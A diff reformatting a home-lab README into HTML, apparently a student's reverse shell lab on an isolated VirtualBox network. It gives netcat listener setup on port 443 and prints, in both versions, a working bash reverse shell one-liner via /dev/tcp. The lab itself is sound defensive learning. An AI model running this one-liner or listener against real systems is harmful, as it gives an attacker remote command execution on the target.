@@ -1,93 +1,114 @@
-Reverse Shell Lab
-This project demonstrates how reverse shells operate at a fundamental level and why they are commonly used to gain remote access. By observing outbound connections in an isolated environment, the lab shows how reverse shells bypass inbound firewall restrictions and what unencrypted traffic looks like in transit. This provides a practical foundation for understanding attacker behavior, firewall limitations, and early indicators of compromise.
+<h2>📘 Reverse Shell Lab</h2>
 
-Most home and enterprise networks block incoming connections but allow outbound traffic. A reverse shell takes advantage of this by having the target initiate the connection back to the attacker, allowing remote access even when inbound connections are filtered.
+<p>
+This project demonstrates how reverse shells work at a fundamental level and why they are commonly used to bypass inbound firewall restrictions. 
+By observing outbound connections in an isolated environment, this lab provides a practical foundation for understanding attacker behavior, 
+firewall limitations, and early indicators of compromise.
+</p>
 
-Objective
-Understand how reverse shells establish remote access.
+<hr />
 
-Observe how outbound connections behave in a controlled environment.
+<h2>🎯 Objective</h2>
 
-Analyze why firewalls commonly block inbound traffic but allow outbound traffic.
+<ul>
+  <li>Understand how reverse shells establish remote access.</li>
+  <li>Observe outbound connection behavior in a controlled environment.</li>
+  <li>Analyze why firewalls block inbound traffic but allow outbound traffic.</li>
+  <li>Build intuition for how attackers leverage this behavior in real-world intrusions.</li>
+</ul>
 
-Build intuition for how attackers leverage this behavior in real-world intrusions.
+<hr />
 
-Lab Environment
-Attacker: Raspberry Pi running Ubuntu Server
+<h2>🧪 Lab Environment</h2>
 
-Target: Windows host running an Ubuntu VM
+<ul>
+  <li><strong>Attacker:</strong> Raspberry Pi running Ubuntu Server</li>
+  <li><strong>Target:</strong> Windows host running an Ubuntu VM</li>
+  <li><strong>Networking:</strong> VirtualBox Internal Network (isolated)</li>
+  <li><strong>Tools:</strong> Netcat (OpenBSD), Bash reverse shell</li>
+</ul>
 
-Networking: VirtualBox Internal Network (isolated)
+<hr />
 
-Tools: Netcat (OpenBSD), Bash reverse shell
+<h2>🛠 Tools</h2>
 
-Tools
-Netcat (OpenBSD)
-A lightweight networking utility used for reading and writing data across TCP/UDP connections. In this lab, Netcat acts as the listener waiting for the target to connect back.
+<h3>Netcat (OpenBSD)</h3>
+<p>A lightweight networking utility used for reading and writing data across TCP/UDP connections. In this lab, Netcat acts as the listener waiting for the target to connect back.</p>
 
-Bash Reverse Shell
-A simple Bash one-liner that redirects input/output streams over a TCP connection, enabling remote command execution.
+<h3>Bash Reverse Shell</h3>
+<p>A simple Bash one-liner that redirects input/output streams over a TCP connection, enabling remote command execution.</p>
 
-Netcat Installation
-Update the package list:
+<hr />
 
-bash
-sudo apt update
-Install Netcat:
+<h2>📦 Installing Netcat</h2>
 
-bash
-sudo apt install netcat-openbsd
-Verify installation:
+<h3>1. Update package list</h3>
+<pre><code>sudo apt update
+</code></pre>
 
-bash
-nc -h
-Setting Up the Listener (Attacker Machine)
-Switch to the root user:
+<h3>2. Install Netcat</h3>
+<pre><code>sudo apt install netcat-openbsd
+</code></pre>
 
-bash
-sudo su -
-Check network interfaces:
+<h3>3. Verify installation</h3>
+<pre><code>nc -h
+</code></pre>
 
-bash
-ifconfig
-Start the Netcat listener on port 443:
+<hr />
 
-bash
-nc -l -v -n -p 443
-Parameter Explanation
--l: Listen mode
+<h2>🎧 Setting Up the Listener (Attacker)</h2>
 
--v: Verbose output
+<h3>1. Switch to root</h3>
+<pre><code>sudo su -
+</code></pre>
 
--n: Disable DNS resolution
+<h3>2. Check network interfaces</h3>
+<pre><code>ifconfig
+</code></pre>
 
--p: Specify port
+<h3>3. Start Netcat listener on port 443</h3>
+<pre><code>nc -l -v -n -p 443
+</code></pre>
 
-Port 443 is used because outbound HTTPS traffic is commonly allowed through firewalls.
+<p><strong>Parameter breakdown:</strong></p>
+<ul>
+  <li><strong>-l</strong>: Listen mode</li>
+  <li><strong>-v</strong>: Verbose output</li>
+  <li><strong>-n</strong>: Disable DNS resolution</li>
+  <li><strong>-p</strong>: Specify port</li>
+</ul>
 
-Notes
-Port 443 simulates realistic outbound traffic.
+<p><strong>Note:</strong> Port 443 is commonly allowed through firewalls, simulating realistic outbound HTTPS traffic.</p>
 
-Internal Network mode provides a clean, isolated lab environment.
+<hr />
 
-NAT adapters can be added for internet access, but this project remains offline-only.
+<h2>🖥️ Executing the Reverse Shell (Target VM)</h2>
 
-Executing the Reverse Shell (Target VM)
-Run the following command inside the Ubuntu VM on the Windows host:
+<p>Run the following command inside the Ubuntu VM:</p>
 
-bash
-bash -i >& /dev/tcp/192.168.1.50/443 0>&1
-Replace 192.168.1.50 with the attacker's actual IP address.
+<pre><code>bash -i >& /dev/tcp/192.168.1.50/443 0>&1
+</code></pre>
 
-This command redirects standard input, output, and error streams over a TCP connection back to the listener.
+<p>Replace <code>192.168.1.50</code> with the attacker's actual IP address.</p>
 
-Listener Output (Attacker)
-After executing the reverse shell command on the target, the listener should display output confirming:
+<hr />
 
-The listener is active on port 443
+<h2>📡 Listener Output</h2>
 
-The target initiated the connection
+<p>Once the reverse shell connects, the listener will confirm:</p>
 
-The TCP handshake completed
+<ul>
+  <li>The Pi is listening on port 443</li>
+  <li>The VM initiated the outbound connection</li>
+  <li>The TCP handshake completed</li>
+  <li>Remote command execution is active</li>
+</ul>
 
-Remote command execution is now occurring on the target system
+<hr />
+
+<h2>🔒 Educational Purpose</h2>
+
+<p>
+This project is intended solely for defensive security learning in a controlled, isolated environment. 
+It helps build intuition for attacker tradecraft, suspicious outbound traffic patterns, and firewall behavior.
+</p>
